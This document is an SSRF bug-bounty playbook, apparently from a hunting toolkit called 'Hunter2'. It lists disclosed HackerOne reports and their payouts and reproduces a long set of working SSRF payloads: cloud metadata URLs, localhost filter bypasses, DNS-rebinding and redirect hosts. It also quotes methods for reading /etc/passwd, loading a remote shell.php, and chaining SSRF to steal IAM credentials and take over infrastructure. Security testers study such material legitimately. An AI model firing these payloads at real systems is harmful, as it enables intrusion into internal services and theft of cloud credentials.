# Real-World Playbook — SSRF (Server-Side Request Forgery)

**Class:** `ssrf` · **Coverage-matrix tier:** 0 · **Hunter2:** /ssrf-chain · tools/oob_listener.py · **Skill:** ssrf
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed SSRF reports peak at **$25,000**. Rewarded across: Aiven Ltd, Dropbox, EXNESS, GitLab, HackerOne, Internet Bug Bounty, Kubernetes, LY Corporation.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **Server Side Request Forgery (SSRF) via Analytics Reports** — HackerOne, $25,000 · 524👍 · [2262382](https://hackerone.com/reports/2262382)
- **Full Response SSRF via Google Drive** — Dropbox, $17,576 · 302👍 · [1406938](https://hackerone.com/reports/1406938)
- **SSRF on project import via the remote_attachment_url on a Note** — GitLab, $10,000 · 359👍 · [826361](https://hackerone.com/reports/826361)
- **Blind SSRF to internal services in matrix preview_link API** — Reddit, $6,000 · 343👍 · [1960765](https://hackerone.com/reports/1960765)
- **Full read SSRF via Lark Docs `import as docs` feature** — Lark Technologies, $5,000 · 124👍 · [1409727](https://hackerone.com/reports/1409727)
- **[Kafka Connect] [JdbcSinkConnector][HttpSinkConnector] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia** — Aiven Ltd, $5,000 · 56👍 · [1547877](https://hackerone.com/reports/1547877)
- **Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.** — Kubernetes, $5,000 · 21👍 · [776017](https://hackerone.com/reports/776017)
- **important: Apache HTTP Server on WIndows UNC SSRF (CVE-2024-38472)** — Internet Bug Bounty, $4,920 · 45👍 · [2585385](https://hackerone.com/reports/2585385)
- **Server Side Request Forgery (SSRF) at app.hellosign.com leads to AWS private keys disclosure** — Dropbox, $4,913 · 360👍 · [923132](https://hackerone.com/reports/923132)
- **Libuv: Improper Domain Lookup that potentially leads to SSRF attacks** — Internet Bug Bounty, $4,860 · 74👍 · [2429894](https://hackerone.com/reports/2429894)
- **SSRF on music.line.me through getXML.php** — LY Corporation, $4,500 · 135👍 · [746024](https://hackerone.com/reports/746024)
- **important: Apache HTTP Server: SSRF with mod_rewrite in server/vhost context on Windows (CVE-2024-40898)** — Internet Bug Bounty, $4,263 · 19👍 · [2612028](https://hackerone.com/reports/2612028)
- **Unauthenticated blind SSRF in OAuth Jira authorization controller** — GitLab, $4,000 · 238👍 · [398799](https://hackerone.com/reports/398799)
- **SSRF via Office file thumbnails** — Slack, $4,000 · 107👍 · [671935](https://hackerone.com/reports/671935)
- **SSRF in Functional Administrative Support Tool pdf generator (████) [HtUS]** — U.S. Dept Of Defense, $4,000 · 46👍 · [1628209](https://hackerone.com/reports/1628209)
- **Blind SSRF on errors.hackerone.net due to Sentry misconfiguration** — HackerOne, $3,500 · 143👍 · [374737](https://hackerone.com/reports/374737)
- **SSRF in graphQL query (pwapi.ex2b.com)** — EXNESS, $3,000 · 261👍 · [1864188](https://hackerone.com/reports/1864188)
- **Stored XSS & SSRF in Lark Docs** — Lark Technologies, $3,000 · 178👍 · [892049](https://hackerone.com/reports/892049)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
url = input("Enter URL:")
response = requests.get(url)
return response
```
```
http://169.254.169.254/latest/meta-data/
```
```
  http://localhost:80
  http://localhost:22
  https://localhost:443
```
```
  http://127.0.0.1:80
  http://127.0.0.1:22
  https://127.0.0.1:443
```
```
  http://0.0.0.0:80
  http://0.0.0.0:22
  https://0.0.0.0:443
```
```
    http://[::]:80/
```
```
    http://[0000::1]:80/
```
```
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://[::ffff:127.0.0.1]
```
```
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
```
```
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```
```
http://0/
http://127.1
http://127.0.1
```
```
    http://2130706433/ = http://127.0.0.1
    http://3232235521/ = http://192.168.0.1
    http://3232235777/ = http://192.168.1.1
    http://2852039166/ = http://169.254.169.254
```
```
    http://0177.0.0.1/ = http://127.0.0.1
    http://o177.0.0.1/ = http://127.0.0.1
    http://0o177.0.0.1/ = http://127.0.0.1
    http://q177.0.0.1/ = http://127.0.0.1
```
```
    http://0x7f000001 = http://127.0.0.1
    http://0xc0a80101 = http://192.168.1.1
    http://0xa9fea9fe = http://169.254.169.254
```
```
    http://127.0.0.1/%61dmin
    http://127.0.0.1/%2561dmin
```
```
    http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
```
```
   http://ip6-localhost = ::1
   http://ip6-loopback = ::1
```
```
    https://307.r3dir.me/--to/?url=http://localhost
```
```
    https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
```
```
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```
```
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 1.2.3.4

$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 169.254.169.254
```
```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```
```
<?php 
 echo var_dump(filter_var("http://test???test.com", FILTER_VALIDATE_URL));
 echo var_dump(filter_var("0://evil.com;google.com", FILTER_VALIDATE_URL));
?>
```
```
$ ping PayloadsAllTheThings.localhost -c 1
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### Server-Side Request Forgery

|ID          |
|------------|
|WSTG-INJT-19|

#### Summary

Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).

#### Test Objectives

- Identify SSRF injection points.
- Test if the injection points are exploitable.
- Asses the severity of the vulnerability.

#### How to Test

When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.

Consider the following request:

``` http
GET https://example.com/page?page=about.php
```

You can test this request with the following payloads.

##### Load the Contents of a File

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

##### Access a Restricted Page

```http
GET https://example.com/page?page=http://localhost/admin
```

Or:

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.

These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.

##### Fetch a Local File

```http
GET https://example.com/page?page=file:///etc/passwd
```

##### HTTP Methods Used

All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.


*(truncated — open the source link for the full method)*

### From AllAboutBugBounty
### Server Side Request Forgery (SSRF)

#### Introduction
Server Side Request Forgery is a web application vulnerability that allows attackers to make outgoing requests originating from the vulnerable server

#### Where to find
Usually it can be found in the request that contain request to another url, for example like this
```
POST /api/check/products HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Origin: https://example.com
Referer: https://example.com

urlApi=http://192.168.1.1%2fapi%2f&id=1
```

or

```
GET /image?url=http://192.168.1.1/
Host: example.com
```

#### How to exploit
1. Basic payload
```
http://127.0.0.1:1337
http://localhost:1337
```

2. Hex encoding
```
http://127.0.0.1 -> http://0x7f.0x0.0x0.0x1
```

3. Octal encoding
```
http://127.0.0.1 -> http://0177.0.0.01
```

4. Dword encoding
```
http://127.0.0.1 -> http://2130706433
```

5. Mixed encoding
```
http://127.0.0.1 -> http://0177.0.0.0x1
```

6. Using URL encoding
```
http://localhost -> http://%6c%6f%63%61%6c%68%6f%73%74
```

7. Using IPv6
```
http://0000::1:1337/
http://[::]:1337/
```

8. Using bubble text
```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ

Use this https://capitalizemytitle.com/bubble-text-generator/
```

#### How to exploit (URI Scheme)

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### SSRF (Server Side Request Forgery)


#### Basic Information

A **Server-side Request Forgery (SSRF)** vulnerability occurs when an attacker manipulates a **server-side application** into making **HTTP requests** to a domain of their choice. This vulnerability exposes the server to arbitrary external requests directed by the attacker.

##### GeoNetwork SLD tool SSRF

../../network-services-pentesting/pentesting-web/geonetwork.md

#### Capture SSRF

The first thing you need to do is to capture a SSRF interaction generated by you. To capture a HTTP or DNS interaction you can use tools such as:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- SSRF → cloud metadata (169.254.169.254 / metadata.google) → **IAM creds** → infra takeover
- SSRF → internal admin panels / unauthenticated internal APIs
- Blind SSRF → confirm via OOB (interactsh); then escalate to gopher/redis/file schemes
- SSRF via URL param, webhook, PDF/image/importer, XXE, or SVG

## Hunter2 wiring
- **Run:** `/ssrf-chain · tools/oob_listener.py`
- **Skill:** `ssrf`
- **Coverage-matrix tier:** 0 (Tier 0 = test first)
